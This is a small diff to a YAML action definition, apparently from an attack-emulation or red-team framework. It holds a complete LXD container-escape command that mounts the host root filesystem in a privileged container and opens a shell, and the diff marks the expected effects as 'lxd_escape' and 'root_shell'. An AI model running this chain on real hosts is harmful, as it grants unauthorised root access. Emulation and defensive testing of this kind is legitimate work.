@@ -8,9 +8,10 @@ parameters:
 command_template: lxc init ubuntu:20.04 privesc -c security.privileged=true && lxc
   config device add privesc host-root disk source=/ path=/mnt/root recursive=true
   && lxc start privesc && lxc exec privesc /bin/sh
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- lxd_escape
+- root_shell
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
